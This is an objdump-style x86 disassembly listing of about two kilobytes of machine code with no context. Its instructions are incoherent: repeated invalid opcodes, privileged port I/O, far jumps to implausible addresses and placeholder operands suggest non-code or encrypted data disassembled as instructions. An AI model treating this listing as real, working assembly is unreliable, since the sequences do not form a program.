  420ad2:	test   eax,0x2a3b38f7
  420ad7:	adc    eax,ecx
  420ad9:	jecxz  0x420b45
  420adb:	xchg   ebp,eax
  420adc:	add    ch,0x58
  420adf:	loope  0x420b3d
  420ae1:	ror    BYTE PTR [esi+edx*1-0x24242db9],1
  420ae8:	and    al,0x92
  420aea:	inc    edx
  420aeb:	test   al,0xfe
  420aed:	mov    ebp,0xded80d29
  420af2:	jno    0x420b27
  420af4:	jae    0x420b2e
  420af6:	cdq    
  420af7:	and    ebp,DWORD PTR [ebp-0x2a]
  420afa:	mov    dh,0x2b
  420afc:	push   ds
  420afd:	sub    DWORD PTR [edx+0x73],ecx
  420b00:	idiv   BYTE PTR [eax-0x51]
  420b03:	shl    DWORD PTR [ebx],1
  420b05:	push   ss
  420b06:	mov    ecx,0xe4a8a476
  420b0b:	fdiv   DWORD PTR [ebp-0x34]
  420b0e:	mov    edi,0x7fcfc9e7
  420b13:	mov    ch,0xc2
  420b15:	imul   ecx,DWORD PTR [di-0x720],0x9
  420b1b:	cmp    ebx,ebx
  420b1d:	das    
  420b1e:	(bad)  
  420b1f:	mov    eax,ds:0x3848a86c
  420b24:	xlat   BYTE PTR ds:[ebx]
  420b25:	enter  0x438e,0x12
  420b29:	(bad)  
  420b2a:	fnstenv [ecx-0x60d24d4d]
  420b30:	add    eax,0xef1fd031
  420b35:	ins    BYTE PTR es:[edi],dx
  420b36:	cmovg  eax,DWORD PTR [ebx+edi*4]
  420b3a:	and    al,0x18
  420b3c:	aad    0xd0
  420b3e:	fadd   QWORD PTR [edx+eiz*8-0x3e]
  420b42:	lds    edi,FWORD PTR [edx+0x10]
  420b45:	xchg   BYTE PTR [eax-0x568a8f75],cl
  420b4b:	mov    esp,0x8f2415ea
  420b50:	repnz xor bl,BYTE PTR [edx-0x2a]
  420b54:	sar    bh,1
  420b56:	jo     0x420b7b
  420b58:	fstp   TBYTE PTR [edi+eax*1-0x73ddcc9a]
  420b5f:	imul   ebx,DWORD PTR [edi-0x68],0xea731e6f
  420b66:	scas   al,BYTE PTR es:[edi]
  420b67:	mov    WORD PTR [esi-0x628a74cb],fs
  420b6d:	jmp    0xaa54fc17
  420b72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420b73:	nop
  420b74:	out    dx,eax
  420b75:	out    dx,eax
  420b76:	xchg   ebp,eax
  420b77:	adc    eax,0x1f329ff3
  420b7c:	cmp    dh,BYTE PTR [ebp+0x19f46c10]
  420b82:	inc    ebx
  420b83:	push   eax
  420b84:	or     eax,0x3c9850c0
  420b89:	xchg   edi,eax
  420b8a:	push   es
  420b8b:	(bad)  
  420b8c:	in     al,dx
  420b8d:	dec    eax
  420b8e:	mov    ebx,0xc1a858a3
  420b93:	sbb    al,0x13
  420b95:	and    al,bl
  420b97:	fs in  eax,dx
  420b99:	loope  0x420c05
  420b9b:	xlat   BYTE PTR ds:[ebx]
  420b9c:	pop    es
  420b9d:	mov    dh,0x66
  420b9f:	jg     0x420b36
  420ba1:	sbb    dl,BYTE PTR [ebx+0x5afccfd0]
  420ba7:	(bad)  
  420ba8:	push   eax
  420ba9:	sub    BYTE PTR ds:0xee87a8d2,ah
  420baf:	int    0xb6
  420bb1:	xor    al,BYTE PTR [edx+0x7]
  420bb4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420bb5:	jne    0x420b38
  420bb7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420bb8:	enter  0xdd5b,0x8a
  420bbc:	cmp    al,dh
  420bbe:	test   BYTE PTR [ecx+0x565c5476],0x9b
  420bc5:	adc    eax,0x54250675
  420bca:	sbb    ebx,ecx
  420bcc:	fadd   DWORD PTR [eax+0x21]
  420bcf:	xchg   ebp,eax
  420bd0:	repz sub BYTE PTR [edx],cl
  420bd3:	or     DWORD PTR [ebx-0x4e0683ea],esi
  420bd9:	sub    eax,eax
  420bdb:	hlt    
  420bdc:	xlat   BYTE PTR ds:[ebx]
  420bdd:	add    al,0x2a
  420bdf:	std    
  420be0:	shl    DWORD PTR [ecx-0x2a],1
  420be3:	and    BYTE PTR [edx+eiz*2+0x4d],dh
  420be7:	push   ecx
  420be8:	xor    DWORD PTR [ebp-0x33b1c6c4],0xffffffd2
  420bef:	xor    al,0x9a
  420bf1:	xor    eax,0x1f53df89
  420bf6:	sub    BYTE PTR [ecx-0x39],al
  420bf9:	shl    edx,0x24
  420bfc:	inc    esp
  420bfd:	jnp    0x420c5c
  420bff:	push   ebp
  420c00:	mov    esi,0xeef0f2c3
  420c05:	in     eax,0x95
  420c07:	or     eax,0x2ad5f4ac
  420c0c:	sub    al,0x88
  420c0e:	fild   WORD PTR [ebx-0x41]
  420c11:	(bad)  
  420c12:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420c13:	test   eax,0xdcfd4c4a
  420c18:	cmp    eax,0xf737bb6
  420c1d:	popa   
  420c1e:	dec    edi
  420c1f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420c20:	(bad)  
  420c21:	adc    cl,BYTE PTR ds:0xcbd264bd
  420c27:	or     al,0x63
  420c29:	shr    DWORD PTR [ecx-0x45],cl
  420c2c:	aas    
  420c2d:	imul   DWORD PTR [ecx+0x2b484258]
  420c33:	jp     0x420c88
  420c35:	jo     0x420c30
  420c37:	mov    ebx,DWORD PTR [esi-0x1e56ff14]
  420c3d:	or     BYTE PTR [ecx+0x7cac891f],al
  420c43:	hlt    
  420c44:	add    edi,DWORD PTR [ecx]
  420c46:	inc    ebp
  420c47:	fild   WORD PTR [ecx+0x10]
  420c4a:	sub    al,al
  420c4c:	(bad)
  420c4f:	dec    eax
  420c50:	inc    edx
  420c51:	dec    esi
  420c52:	(bad)
  420c55:	or     BYTE PTR [ebx+0x76f5ef81],dl
  420c5b:	fdiv   QWORD PTR ds:0xc61945e8
  420c61:	fwait
  420c62:	pop    ds
  420c63:	gs in  al,0x5b
  420c66:	ret    0x92e
  420c69:	rol    eax,cl
  420c6b:	mov    cs,esi
  420c6d:	xor    BYTE PTR ss:[ebp-0x3c398988],bl
  420c74:	or     DWORD PTR [eax+edx*4+0x3a],0x980fb3ac
  420c7c:	push   ecx
  420c7d:	xor    BYTE PTR [ecx+0x2c],0x2d
  420c81:	mov    al,ss:0xfb35cc5c
  420c87:	arpl   cx,bx
  420c89:	mov    dl,0x8
  420c8b:	sar    DWORD PTR [esi-0x65],cl
  420c8e:	pop    ss
  420c8f:	in     al,0x65
  420c91:	pop    es
  420c92:	pop    eax
  420c93:	js     0x420d11
  420c95:	mov    esi,0x788d0648
  420c9a:	pop    ebp
  420c9b:	xchg   ebp,eax
  420c9c:	fcom   QWORD PTR [esi+0x38]
  420c9f:	mov    ds:0x1a8c2e34,eax
  420ca4:	push   0x56
  420ca6:	test   al,0xbd
  420ca8:	sahf   
  420ca9:	sbb    ebp,0x48
  420cac:	pop    es
  420cad:	aaa    
  420cae:	call   0xa066:0x3ba22156
  420cb5:	xchg   esp,eax
  420cb6:	push   0x73
  420cb8:	(bad)  
  420cb9:	loopne 0x420c6b
  420cbb:	push   esp
  420cbc:	mov    DWORD PTR [ebx],edx
  420cbe:	xchg   BYTE PTR [ecx-0x6a643a57],bh
  420cc4:	out    dx,eax
  420cc5:	or     BYTE PTR [ebx],cl
  420cc7:	push   esp
  420cc8:	mov    esp,0xe40711d
  420ccd:	lods   eax,DWORD PTR ds:[esi]
  420cce:	or     ebp,DWORD PTR [edi+0x7da8a4bc]
  420cd4:	or     BYTE PTR ds:0xc471db0f,bh
  420cda:	jbe    0x420cc1
  420cdc:	sub    ah,BYTE PTR [ebx+ecx*8+0x122922b9]
  420ce3:	push   ebp
  420ce4:	mov    ecx,0x3c6d5ec1
  420ce9:	mov    edx,0xaa151297
  420cee:	sub    eax,DWORD PTR [ecx+0x1e3961bb]
  420cf4:	aaa    
  420cf5:	mov    eax,0xdc86c2b4
  420cfa:	inc    edi
  420cfb:	inc    esi
  420cfc:	in     al,dx
  420cfd:	xor    eax,esp
  420cff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420d00:	xchg   edx,eax
  420d01:	push   ebx
  420d02:	push   0x3a
  420d04:	in     eax,0x1f
  420d06:	inc    DWORD PTR [edx+0x29df39de]
  420d0c:	or     al,0xcd
  420d0e:	dec    eax
  420d0f:	into   
  420d10:	into   
  420d11:	pop    edx
  420d12:	mov    eax,ds:0xe9ab8bb
  420d17:	jle    0x420d14
  420d19:	or     DWORD PTR [ebx],ecx
  420d1b:	in     al,0xd9
  420d1d:	ss add al,dl
  420d20:	add    ebx,DWORD PTR [ebp+0x38d30db9]
  420d26:	mov    cl,0x13
  420d28:	xor    al,0xe7
  420d2a:	popa   
  420d2b:	mov    edx,DWORD PTR cs:[ecx]
  420d2e:	inc    esi
  420d2f:	jns    0x420cd0
  420d31:	fisub  WORD PTR [esi-0x6500b05c]
  420d37:	sbb    al,0x3
  420d39:	add    BYTE PTR ds:0x3c7a772f,ch
  420d3f:	xchg   edi,eax
  420d40:	push   edi
  420d41:	sbb    DWORD PTR [edi-0x71439e5b],0x32
  420d48:	push   edi
  420d49:	inc    esi
  420d4a:	loope  0x420d87
  420d4c:	repz pop esi
  420d4e:	mov    fs,WORD PTR [ecx+0x21]
  420d51:	fldpi  
  420d53:	and    ebx,ecx
  420d55:	gs sbb eax,0x41ba2012
  420d5b:	outs   dx,DWORD PTR ds:[esi]
  420d5c:	jo     0x420d8a
  420d5e:	xchg   esi,eax
  420d5f:	jnp    0x420d79
  420d61:	or     al,bh
  420d63:	dec    ebp
  420d64:	mov    bh,0xd0
  420d66:	retf   
  420d67:	div    BYTE PTR [edi+0x35]
  420d6a:	push   es
  420d6b:	in     eax,0x83
  420d6d:	inc    edi
  420d6e:	inc    ebx
  420d6f:	pop    ss
  420d70:	xchg   esi,eax
  420d71:	stos   DWORD PTR es:[edi],eax
  420d72:	lods   eax,DWORD PTR ds:[esi]
  420d73:	js     0x420de3
  420d75:	(bad)  
  420d76:	push   ebp
  420d77:	lock jmp 0x420d94
  420d7a:	mov    dh,0x3d
  420d7c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420d7d:	dec    edi
  420d7e:	dec    eax
  420d7f:	rol    eax,cl
  420d81:	push   ecx
  420d82:	mov    ds:0x94213aeb,eax
  420d87:	push   edx
  420d88:	push   0xcb6ec994
  420d8d:	cmc    
  420d8e:	sbb    DWORD PTR [ebx-0x32],esi
  420d91:	pushf  
  420d92:	add    edi,DWORD PTR [eax-0x7695409c]
  420d98:	aaa    
  420d99:	stos   BYTE PTR es:[edi],al
  420d9a:	fisubr WORD PTR [eax+0x23]
  420d9d:	sub    eax,0x815ca02d
  420da2:	dec    ebx
  420da3:	xchg   dl,bh
  420da5:	hlt    
  420da6:	out    dx,al
  420da7:	pop    esp
  420da8:	add    eax,0xa7c45ab3
  420dad:	jl     0x420e2d
  420daf:	jg     0x420dd8
  420db1:	dec    ebx
  420db2:	push   edi
  420db3:	pop    fs
  420db5:	fadd   DWORD PTR [esi-0x7bf3a1c3]
  420dbb:	mov    al,ds:0x6dd49aeb
  420dc0:	jp     0x420d73
  420dc2:	xchg   edx,eax
  420dc3:	ret    0x3eb5
  420dc6:	dec    ecx
  420dc7:	loopne 0x420d4b
  420dc9:	pop    edx
  420dca:	inc    esp
  420dcb:	sbb    BYTE PTR [edx],ch
  420dcd:	mov    ah,0xf9
  420dcf:	push   0xffffff95
  420dd1:	cmp    al,0xd2
  420dd3:	inc    eax
  420dd4:	loop   0x420dd4
  420dd6:	mov    al,ds:0x51a34394
  420ddb:	in     eax,dx
  420ddc:	xor    eax,0x2b104843
  420de1:	mov    bh,0xce
  420de3:	out    dx,al
  420de4:	adc    al,0x51
  420de6:	loope  0x420dc5
  420de8:	mov    ebx,0x540cbf27
  420ded:	sub    eax,0x17967d47
  420df2:	fsubr  st,st(1)
  420df4:	gs leave 
  420df6:	popa   
  420df7:	outs   dx,DWORD PTR ds:[esi]
  420df8:	push   ds
  420df9:	dec    ebx
  420dfa:	mov    eax,0xe5dd6959
  420dff:	push   edx
  420e00:	cs sbb eax,esp
  420e03:	xchg   edi,eax
  420e04:	cmp    eax,0x580e3c3a
  420e09:	in     eax,0x5c
  420e0b:	fsub   st,st(1)
  420e0d:	adc    dh,bh
  420e0f:	(bad)  
  420e10:	xchg   ebp,eax
  420e11:	and    eax,0x2d70d7fd
  420e16:	test   eax,0xcad9d410
  420e1b:	out    0x1e,eax
  420e1d:	cli    
  420e1e:	fwait
  420e1f:	ret    0x4456
  420e22:	jmp    edx
  420e24:	test   BYTE PTR [eax+edx*1-0x5c],0xb9
  420e29:	call   0xacb07a26
  420e2e:	lahf   
  420e2f:	call   0xab94323d
  420e34:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420e35:	sub    BYTE PTR [ecx-0x469d4c9f],bh
  420e3b:	(bad)  
  420e3c:	test   al,0xc0
  420e3e:	adc    al,0xba
  420e40:	leave  
  420e41:	lock rcr al,1
  420e44:	arpl   WORD PTR [esi],bp
  420e46:	popf   
  420e47:	cmp    eax,0x2fdecfe8
  420e4c:	jnp    0x420e11
  420e4e:	test   esp,eax
  420e50:	push   0x43
  420e52:	mov    esi,0x538ebd49
  420e57:	adc    al,0x2a
  420e59:	je     0x420e54
  420e5b:	sub    ebx,DWORD PTR [edx+0x3a0b3f93]
  420e61:	pusha  
  420e62:	and    DWORD PTR [edi+0x6d],edi
  420e65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420e66:	and    eax,0x7dd195df
  420e6b:	xchg   ebp,eax
  420e6c:	aad    0x71
  420e6e:	or     al,0x18
  420e70:	and    eax,0x4e503db9
  420e75:	mov    dh,0xfa
  420e77:	jg     0x420e55
  420e79:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420e7a:	in     al,dx
  420e7b:	pop    edi
  420e7c:	pop    ebx
  420e7d:	jnp    0x420e10
  420e7f:	loopne 0x420ed1
  420e81:	pop    si
  420e83:	call   0xef76:0x628e00e5
  420e8a:	xchg   esi,eax
  420e8b:	mov    esi,DWORD PTR [edi+0x78fbd30]
  420e91:	jbe    0x420e4d
  420e93:	loop   0x420e65
  420e95:	push   0x11
  420e97:	push   0x6c339b18
  420e9c:	mov    eax,fs:0xa56a3e14
  420ea2:	adc    eax,DWORD PTR [esi+0x6f]
  420ea5:	nop
  420ea6:	mov    bl,0xb4
  420ea8:	mov    esp,0x71bd4746
  420ead:	push   edi
  420eae:	adc    DWORD PTR [ebx+ecx*1+0x75],ebx
  420eb2:	dec    edx
  420eb3:	dec    eax
  420eb4:	jb     0x420e65
  420eb6:	imul   esi,DWORD PTR [ecx+0x38],0xffffffdf
  420eba:	es js  0x420ea5
  420ebd:	bound  esi,QWORD PTR [ebx-0x44]
  420ec0:	inc    esp
  420ec1:	dec    esp
  420ec2:	ins    DWORD PTR es:[edi],dx
  420ec3:	add    esi,esi
  420ec5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420ec6:	xchg   dl,ah
  420ec8:	mov    dl,0xd0
  420eca:	cs stos DWORD PTR es:[edi],eax
  420ecc:	fcomp  DWORD PTR ds:0x5f878ce5
  420ed2:	(bad)
  420ed5:	fidiv  WORD PTR [ebp-0x33659f27]
  420edb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420edc:	sub    esp,ebx
  420ede:	pop    esi
  420edf:	mov    ch,0x58
  420ee1:	cmc    
  420ee2:	mov    WORD PTR [ebx],cs
  420ee4:	mov    ecx,0xbe024ed2
  420ee9:	fnstsw WORD PTR [ebx+ebp*8-0x334c80bc]
  420ef0:	test   al,0xe7
  420ef2:	jmp    edx
  420ef4:	ja     0x420eb7
  420ef6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420ef7:	rcl    dl,1
  420ef9:	imul   DWORD PTR [ecx]
  420efb:	cli    
  420efc:	mov    cl,0x26
  420efe:	(bad)  
  420f00:	(bad)  
  420f01:	fsubr  st,st(2)
  420f03:	mov    DWORD PTR [edi+0x13ce64bd],0xc813d38a
  420f0d:	ret    
  420f0e:	in     eax,dx
  420f0f:	das    
  420f10:	sahf   
  420f11:	sahf   
  420f12:	mov    al,0x74
  420f14:	xchg   esp,eax
  420f15:	jbe    0x420f01
  420f17:	jbe    0x420ea6
  420f19:	(bad)  
  420f1a:	dec    ebx
  420f1b:	mov    ecx,edi
  420f1d:	aam    0xe0
  420f1f:	push   ebp
  420f20:	or     eax,0x49a524e
  420f25:	bound  ecx,QWORD PTR ds:0x61efe12b
  420f2b:	push   0x5c64e2f6
  420f30:	xchg   edi,eax
  420f31:	retf   
  420f32:	imul   edi,DWORD PTR fs:[edi-0xfb03158],0xb723cb2c
  420f3d:	jmp    0x2a4:0x8874340b
  420f44:	imul   ecx,DWORD PTR [edx-0x5cfd41df],0x42
  420f4b:	pop    esi
  420f4c:	out    0x69,al
  420f4e:	pop    esp
  420f4f:	cmp    eax,0x8cddef22
  420f54:	xchg   ecx,eax
  420f55:	jmp    0xb5c7c7ba
  420f5a:	sub    ebp,DWORD PTR [eax]
  420f5c:	pushf  
  420f5d:	and    dl,BYTE PTR [eax]
  420f5f:	adc    ah,BYTE PTR [edx+0x73e25f06]
  420f65:	mov    ah,0x6
  420f67:	icebp  
  420f68:	mov    eax,0x8df3ee5b
  420f6d:	outs   dx,DWORD PTR ds:[esi]
  420f6e:	adc    eax,0xe7b565cb
  420f73:	or     cl,BYTE PTR [ecx+ebp*8-0x21]
  420f77:	and    cl,BYTE PTR [ebx]
  420f79:	push   DWORD PTR [eax+0x59]
  420f7c:	dec    edi
  420f7d:	push   0xdadc7595
  420f82:	cmp    bl,BYTE PTR [ebp+ebp*4+0x47]
  420f86:	(bad)  
  420f88:	fsubr  DWORD PTR [esi]
  420f8a:	xor    eax,0x36d0e1b8
  420f8f:	scas   eax,DWORD PTR es:[edi]
  420f90:	(bad)  
  420f91:	icebp  
  420f92:	or     DWORD PTR [ebx+ebp*8],eax
  420f95:	iret   
  420f96:	aas    
  420f97:	sub    DWORD PTR [esi],0xffffff83
  420f9a:	test   ebx,edx
  420f9c:	or     BYTE PTR [esi],0xf1
  420f9f:	push   eax
  420fa0:	rol    DWORD PTR [edi],0x7e
  420fa3:	outs   dx,BYTE PTR ds:[esi]
  420fa4:	out    dx,eax
  420fa5:	test   eax,0xf1ad1b9
  420faa:	jle    0x420fd1
  420fac:	mov    al,ds:0x4049e623
  420fb1:	loope  0x421003
  420fb3:	cwde   
  420fb4:	stos   BYTE PTR es:[edi],al
  420fb5:	fcomp  DWORD PTR [ebp-0x15]
  420fb8:	rcr    DWORD PTR [edx+0x1a8ca7f],1
  420fbe:	jnp    0x421020
  420fc0:	jecxz  0x420f75
  420fc2:	in     al,0x83
  420fc4:	jmp    0xba9c152f
  420fc9:	cmc    
  420fca:	adc    al,0x7e
  420fcc:	or     ebp,DWORD PTR [esi+edi*4]
  420fcf:	repz bound edi,QWORD PTR [esi]
  420fd2:	stos   DWORD PTR es:[edi],eax
  420fd3:	repnz cmp edi,edx
  420fd6:	mov    dl,BYTE PTR [edx]
  420fd8:	add    ecx,ecx
  420fda:	mov    ds:0xc222c203,al
  420fdf:	mov    esp,0x61f2c45
  420fe4:	into   
  420fe5:	test   al,0x9b
  420fe7:	xchg   si,ax
  420fe9:	jge    0x420fb1
  420feb:	jl     0x42100d
  420fed:	out    0x3,eax
  420fef:	sub    eax,0x295e1742
  420ff4:	xchg   ecx,eax
  420ff5:	xor    ecx,DWORD PTR [eax+0x71d8b1da]
  420ffb:	sbb    BYTE PTR ds:0x22d23179,dh
  421001:	cmp    bh,BYTE PTR [ecx+eax*1+0x518b5690]
  421008:	mov    eax,?
  42100a:	jo     0x42105e
  42100c:	dec    eax
  42100d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42100e:	and    BYTE PTR [eax+0x23],0xe3
  421012:	sbb    eax,0x240fa9f5
  421017:	xor    al,0xde
  421019:	xor    DWORD PTR [edx],0xffffff80
  42101c:	or     BYTE PTR [esi],bl
  42101e:	adc    al,0x19
  421020:	xchg   ebp,eax
  421021:	inc    eax
  421022:	xor    dl,al
  421024:	loope  0x421076
  421026:	in     eax,0xa1
  421028:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421029:	sub    BYTE PTR [eax],0x8b
  42102c:	repnz mov gs,WORD PTR [edx+edx*2+0x5ba64787]
  421034:	adc    ch,BYTE PTR [eax-0x21]
  421037:	mov    al,ds:0x194eefed
  42103c:	jne    0x421085
  42103e:	bswap  edx
  421040:	aas    
  421041:	jmp    0x42108a
  421043:	clc    
  421044:	sub    al,0x11
  421046:	aaa    
  421047:	hlt    
  421048:	sbb    al,0xe2
  42104b:	cmp    al,0x49
  42104d:	mov    al,ds:0x6b106c02
  421052:	push   ds
  421053:	scas   eax,DWORD PTR es:[edi]
  421054:	pushf  
  421055:	(bad)  
  421057:	pop    ebp
  421058:	cmp    al,BYTE PTR [edi-0x7a165cb8]
  42105e:	sub    DWORD PTR [esi+0x65491084],esi
  421064:	cwde   
  421065:	neg    DWORD PTR [ecx+0x39]
  421068:	ror    DWORD PTR [edi+ebx*2+0xa],0xba
  42106d:	aad    0x47
  42106f:	sbb    ch,BYTE PTR [esi+0x65]
  421072:	mov    ds:0xdb9925b1,eax
  421077:	lds    ebp,FWORD PTR [esi+ecx*8+0x54952f04]
  42107e:	xor    ebp,DWORD PTR ds:0x6a1da62e
  421084:	ja     0x421095
  421086:	aad    0x2
  421088:	fbld   TBYTE PTR [edx]
  42108a:	dec    esp
  42108b:	adc    eax,DWORD PTR [ebx-0x2f9ee1dd]
  421091:	mov    ah,0x82
  421093:	xor    al,0xaf
  421095:	(bad)  
  421098:	aaa    
  421099:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42109a:	mov    edx,0x4320a462
  42109f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4210a0:	icebp  
  4210a1:	or     dl,BYTE PTR [edx-0x30ebd514]
  4210a7:	pop    ecx
  4210a8:	mov    WORD PTR [edx-0x33],ss
  4210ab:	out    0x7c,eax
  4210ad:	cmp    al,ah
  4210af:	sbb    edi,DWORD PTR [eax]
  4210b1:	int3   
  4210b2:	sahf   
  4210b3:	add    al,0xba
  4210b5:	or     dl,BYTE PTR [edi+0x10]
  4210b8:	dec    ecx
  4210b9:	repz xor dl,BYTE PTR ds:0x634c243d
  4210c0:	xchg   ecx,eax
  4210c1:	nop
  4210c2:	adc    esi,DWORD PTR [ebp-0x38]
  4210c5:	cmp    cl,0x57
  4210c8:	adc    BYTE PTR [edi],cl
  4210ca:	jnp    0x4210c8
  4210cc:	dec    ecx
  4210cd:	mov    dl,0x43
  4210cf:	mov    ds:0x63022e09,eax
  4210d4:	or     eax,0x936855c1
  4210d9:	out    0xc0,al
  4210db:	sahf   
  4210dc:	push   ss
  4210dd:	or     bl,BYTE PTR ds:0x2cfa6a5b
  4210e3:	pop    eax
  4210e4:	div    BYTE PTR [ebx+0x4cd47722]
  4210ea:	sub    cl,al
  4210ec:	and    eax,0xd6be95a4
  4210f1:	pop    edi
  4210f2:	shr    DWORD PTR [edi+0x2a],cl
  4210f5:	ins    BYTE PTR es:[edi],dx
  4210f6:	aam    0x61
  4210f8:	sub    eax,DWORD PTR [ebx-0x64c775d5]
  4210fe:	cmp    al,0x7c
  421100:	lds    eax,FWORD PTR [ecx]
  421102:	out    0xb1,al
  421104:	lahf   
  421105:	inc    esi
  421106:	xchg   ebp,eax
  421107:	jge    0x4210c5
  421109:	sub    eax,0xf347f5ee
  42110e:	clc    
  42110f:	out    dx,al
  421110:	xor    DWORD PTR [ebx-0x24ef5985],edx
  421116:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  421118:	call   0x680ac30
  42111d:	orps   xmm5,XMMWORD PTR [ebp-0x6d44731c]
  421124:	fisttp QWORD PTR es:[edi+eax*4+0x3a]
  421129:	sbb    ebx,ecx
  42112b:	sub    eax,0x35e5a882
  421130:	shr    edx,1
  421132:	mov    ebx,0x2f62a05
  421137:	clc    
  421138:	lahf   
  421139:	call   0x95b8:0x89bf5c03
  421140:	mov    bh,0x18
  421142:	lods   eax,DWORD PTR ds:[esi]
  421143:	dec    esp
  421144:	pop    ss
  421145:	and    eax,0x63ce1bfc
  42114a:	jns    0x4211b4
  42114c:	gs cld 
  42114e:	std    
  42114f:	int    0x8c
  421151:	sbb    DWORD PTR [eax+0x34],edx
  421154:	mov    WORD PTR [ebx],ds
  421156:	mov    al,0xfc
  421158:	xor    al,0x21
  42115a:	sub    eax,0xef450a68
  42115f:	mov    ebp,0x46ac2532
  421164:	(bad)  
  421166:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421167:	lahf   
  421168:	jns    0x421176
  42116a:	mov    ebx,0x1683538f
  42116f:	imul   esp,ebx,0x53
  421172:	rol    eax,1
  421174:	leave  
  421175:	imul   eax
  421177:	fdivp  st(7),st
  421179:	sahf   
  42117a:	mov    ecx,0x2f77a35c
  42117f:	loopne 0x4211e7
  421181:	out    0x7e,eax
  421183:	and    al,0xa0
  421185:	ins    DWORD PTR es:[edi],dx
  421186:	jp     0x4211e8
  421188:	push   eax
  421189:	ret    0x618a
  42118c:	idiv   ebp
  42118e:	ins    BYTE PTR es:[edi],dx
  42118f:	pop    es
  421190:	inc    esp
  421191:	add    BYTE PTR [eax],dl
  421193:	sbb    dl,BYTE PTR [edx]
  421195:	repz test DWORD PTR [eax],0xd0f607f2
  42119c:	fidivr DWORD PTR [esi+0x16]
  42119f:	std    
  4211a0:	(bad)  
  4211a1:	xor    BYTE PTR [esi],cl
  4211a3:	sub    al,ah
  4211a5:	or     BYTE PTR [edi+0x62c6ec],cl
  4211ab:	pop    ss
  4211ac:	int    0xf9
  4211ae:	sbb    al,0xc3
  4211b0:	sub    esp,ebp
  4211b2:	jge    0x4211a9
  4211b4:	scas   eax,DWORD PTR es:[edi]
  4211b5:	outs   dx,DWORD PTR ds:[esi]
  4211b6:	imul   ecx,DWORD PTR [eax-0x3f],0xffffffe0
  4211ba:	int    0x1a
  4211bc:	sub    ch,BYTE PTR [eax+esi*4]
  4211bf:	scas   al,BYTE PTR es:[edi]
  4211c0:	daa    
  4211c1:	bound  edi,QWORD PTR [edx+eax*1]
  4211c4:	shr    BYTE PTR [ebx],1
  4211c6:	aad    0x2b
  4211c8:	ret    
  4211c9:	adc    dl,dh
  4211cb:	sub    BYTE PTR [ebx],ah
  4211cd:	repz mov al,0x67
  4211d1:	test   al,cl
  4211d3:	mov    ebp,esp
  4211d5:	pusha  
  4211d6:	mov    bh,0x17
  4211d8:	call   FWORD PTR [esi-0x1fb4ce76]
  4211de:	cwde   
  4211df:	std    
  4211e0:	xchg   edx,ecx
  4211e2:	adc    bh,BYTE PTR ds:0xafc75152
  4211e8:	cwde   
  4211e9:	mov    bh,BYTE PTR [esi+0x68]
  4211ec:	loop   0x421216
  4211ee:	ds mov bh,0x26
  4211f1:	cdq    
  4211f2:	imul   edi,DWORD PTR [esp+edi*4+0x4dff9a54],0xfc39a090
  4211fd:	loop   0x4211b6
  4211ff:	jp     0x421277
  421201:	pop    ebx
  421202:	xchg   ebx,eax
  421203:	iret   
  421204:	es int3 
  421206:	mov    ch,0x6a
  421208:	inc    ebp
  421209:	add    ebp,DWORD PTR [edx]
  42120b:	int    0x28
  42120d:	cmp    al,0x7
  42120f:	pusha  
  421210:	(bad)  
  421212:	mov    ah,0x90
  421214:	inc    edx
  421215:	lods   eax,DWORD PTR ds:[esi]
  421216:	push   ebx
  421217:	fistp  QWORD PTR [eax]
  421219:	daa    
  42121a:	out    dx,eax
  42121b:	xchg   ecx,eax
  42121c:	test   eax,0x21b9bcba
  421221:	sub    al,0x1
  421223:	icebp  
  421224:	loop   0x42123f
  421226:	mov    dl,0xc7
  421228:	ror    DWORD PTR [ebx],1
  42122a:	mov    eax,gs:0x2a5d83c3
  421230:	fsub   QWORD PTR [ecx]
  421232:	jmp    0x4211c7
  421234:	cmp    DWORD PTR [ebp+0x54edd3c8],ebx
  42123a:	cmp    al,0xd2
  42123c:	sahf   
  42123d:	arpl   WORD PTR [ebx-0xb],sp
  421240:	adc    edx,DWORD PTR [ebp-0x3a]
  421243:	sub    esi,esp
  421245:	or     eax,0xe0baff96
  42124a:	mov    al,ds:0xbc75580e
  42124f:	mov    DWORD PTR [edi+ebp*8+0x37],edi
  421253:	ss pop ecx
  421255:	cmp    DWORD PTR [ebx],ebx
  421257:	xor    DWORD PTR [esi],0xffffff8e
  42125a:	sbb    DWORD PTR [esi+0x9],eax
  42125d:	pushf  
  42125e:	push   0x51
  421260:	data16 xor BYTE PTR [edi+edx*4+0x329d6ad2],bh
  421268:	lea    eax,[ebp+eax*4+0x1e882c3d]
  42126f:	push   edi
  421270:	xor    ebx,esp
  421272:	adc    edi,DWORD PTR [edi]
  421274:	mov    al,ds:0x750d1290
  421279:	mov    ah,0x36
  42127b:	mov    bl,0x45
  42127d:	(bad)  
  42127e:	cmp    eax,DWORD PTR [ecx+0x18]
  421281:	sub    esi,esp
  421283:	mov    bh,0xab
  421285:	pop    es
  421286:	mov    WORD PTR [ebx],?
  421288:	pop    edx
  421289:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42128a:	mov    ch,0xbe
  42128c:	lahf   
  42128d:	lods   eax,DWORD PTR ds:[esi]
  42128e:	or     al,0x4b
  421290:	out    0xdc,eax
  421292:	ins    BYTE PTR es:[edi],dx
  421293:	popf   
  421294:	int    0xbf
  421296:	das    
  421297:	inc    edx
  421298:	iret   
  421299:	rcl    DWORD PTR [ebx-0x7e],0x32
  42129d:	popf   
